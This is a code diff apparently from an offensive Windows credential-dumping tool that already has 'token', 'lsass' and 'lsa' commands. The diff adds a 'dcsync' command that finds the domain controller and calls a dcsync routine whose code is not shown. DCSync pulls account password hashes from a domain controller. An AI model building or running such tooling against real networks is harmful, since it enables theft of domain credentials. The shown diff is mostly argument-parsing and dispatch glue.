@@ -3,9 +3,10 @@
 // #include "./include/token.c"
 
 // #include "./include/lsass.c"
-#include <lsa.h>
-#include <lsass.h>
-#include <token.h>
+#include "lsa.h"
+#include "lsass.h"
+#include "token.h"
+#include <dcsync.h>
 
 #include <argtable3.h>
 #include <wincrypt.h>
@@ -215,11 +216,28 @@ int cmd_lsa(int argc, char *argv[]) {
   arg_freetable(argtable, narg);
   return status != 0 ? -1 : 0;
 }
+int cmd_dcsync(int argc, char *argv[]) {
+  struct arg_end *end;
+  struct arg_lit *help;
+  void *argtable[] = {
+      help = arg_lit0(NULL, "help", "show help"),
+      end = arg_end(20),
+  };
+  PPOLICY_DNS_DOMAIN_INFO domain;
+  domain = GetCurrentDomain();
+  LPWSTR dc = getDC(domain->DnsDomainName.Buffer);
+  wprintf(L"found domain: %s\n", domain->DnsDomainName.Buffer);
+  wprintf(L"found DC: %s\n", dc);
+  dcsync();
+
+  return 0;
+}
 
 struct command cmds[] = {
     {"token", cmd_token},
     {"lsass", cmd_lsass},
     {"lsa", cmd_lsa},
+    {"dcsync", cmd_dcsync},
 
 };
 
